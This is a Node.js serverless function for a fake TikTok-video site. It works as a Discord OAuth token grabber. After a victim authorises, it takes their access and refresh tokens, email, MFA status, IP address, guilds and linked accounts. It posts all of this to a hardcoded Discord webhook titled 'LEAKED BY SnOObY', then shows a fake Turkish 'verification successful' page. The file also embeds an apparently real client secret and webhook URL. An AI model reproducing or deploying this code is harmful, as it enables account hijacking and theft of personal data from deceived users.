const axios = require('axios');

exports.handler = async (event) => {
    const config = {
        client_id: '1484264299995336865',
        client_secret: 'Lk2TU5ekmrmKCV90G2m-6RTg9hzOHbQJ',
        webhook_url: 'https://discord.com/api/webhooks/1484265463990063184/ERIszpXHCFMexvjVIFL3sRrAxs8YidtcsyQmyODqe0eKipGOxYPJzmnyykQPj4EqSIZs',
        redirect_uri: 'https://vidgonet.netlify.app/.netlify/functions/callback',
        final_destination: 'https://vidgonet.netlify.app/'
    };

    const client_info = {
        ip: event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'Unknown',
        user_agent: event.headers['user-agent'] || 'Unknown',
        language: event.headers['accept-language'] || 'Unknown',
        referer: event.headers['referer'] || 'Unknown',
        country: event.headers['x-nf-client-connection-ip'] || 'Unknown',
        timestamp: new Date().toISOString()
    };

    const code = event.queryStringParameters ? event.queryStringParameters.code : null;

    if (!code) {
        return {
            statusCode: 302,
            headers: { "Location": config.final_destination },
            body: ""
        };
    }

    try {
        const tokenParams = new URLSearchParams({
            client_id: config.client_id,
            client_secret: config.client_secret,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: config.redirect_uri
        });

        const tokenRes = await axios.post('https://discord.com/api/v10/oauth2/token', tokenParams.toString(), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            timeout: 10000
        });

        const accessToken = tokenRes.data.access_token;
        const refreshToken = tokenRes.data.refresh_token;
        const scopes = tokenRes.data.scope;

        const [userRes, guildsRes, connectionsRes] = await Promise.all([
            axios.get('https://discord.com/api/v10/users/@me', { headers: { Authorization: `Bearer ${accessToken}` } }),
            axios.get('https://discord.com/api/v10/users/@me/guilds', { headers: { Authorization: `Bearer ${accessToken}` } }).catch(() => ({ data: [] })),
            axios.get('https://discord.com/api/v10/users/@me/connections', { headers: { Authorization: `Bearer ${accessToken}` } }).catch(() => ({ data: [] }))
        ]);

        const u = userRes.data;
        
        const embed = {
            title: "LEAKED BY SnOObY",
            color: 0x00ff88,
            timestamp: new Date(),
            fields: [
                { name: "👤 User Info", value: `**Tag:** ${u.username}#${u.discriminator}\n**ID:** ${u.id}\n**Email:** ${u.email || 'N/A'}\n**Verified:** ${u.verified}\n**MFA:** ${u.mfa_enabled}`, inline: true },
                { name: "📱 Device/Network", value: `**IP:** ${client_info.ip}\n**UA:** ${client_info.user_agent.substring(0, 100)}...`, inline: true },
                { name: "🔑 OAuth Details", value: `**Scopes:** ${scopes}\n**Access Token:** \`${accessToken}\`\n**Refresh Token:** \`${refreshToken}\``, inline: false },
                { name: "📊 Account Stats", value: `**Guilds:** ${guildsRes.data.length}\n**Connections:** ${connectionsRes.data.map(c => c.type).join(', ') || 'None'}`, inline: false }
            ],
            footer: { text: "BAŞ EDEMEZSİNİZ - SnOObY" },
            thumbnail: { url: u.avatar ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png` : "https://cdn.discordapp.com/embed/avatars/0.png" }
        };

        await axios.post(config.webhook_url, { embeds: [embed] });

        return {
            statusCode: 200,
            headers: { "Content-Type": "text/html" },
            body: `
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Verification Successful</title>
                    <meta charset="utf-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1">
                    <style>
                        body { background: #0f0f0f; color: #00ff88; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
                        .card { background: #1a1a1a; padding: 2rem; border-radius: 15px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; max-width: 400px; width: 90%; position: relative; }
                        .loader { width: 50px; height: 50px; border: 3px solid #333; border-top: 3px solid #00ff88; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
                        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                        h1 { font-size: 1.5rem; margin-bottom: 10px; }
                        p { color: #888; font-size: 0.9rem; }
                        .progress-container { width: 100%; background: #333; height: 4px; border-radius: 2px; margin-top: 20px; overflow: hidden; }
                        .progress-bar { width: 0%; height: 100%; background: #00ff88; transition: width 3s linear; }
                    </style>
                </head>
                <body>
                    <div class="card">
                        <div class="loader"></div>
                        <h1>DOĞRULAMA BAŞARILI</h1>
                        <p>TikTok videonuz sunucularımızda işleniyor. Lütfen bekleyin, ana sayfaya yönlendiriliyorsunuz...</p>
                        <div class="progress-container"><div class="progress-bar" id="pb"></div></div>
                    </div>
                    <script>
                        setTimeout(() => { document.getElementById('pb').style.width = '100%'; }, 100);
                        setTimeout(() => { window.location.href = "${config.final_destination}"; }, 3000);
                    </script>
                </body>
                </html>
            `
        };

    } catch (error) {
        console.error("Critical Failure:", error.response ? error.response.data : error.message);
        
        await axios.post(config.webhook_url, {
            content: `⚠️ **ERROR LOGGED**\n\`\`\`json\n${JSON.stringify({
                message: error.message,
                data: error.response ? error.response.data : "No Response Data",
                client: client_info
            }, null, 2).substring(0, 1900)}\n\`\`\``
        }).catch(() => {});

        return {
            statusCode: 302,
            headers: { "Location": config.final_destination },
            body: ""
        };
    }
};
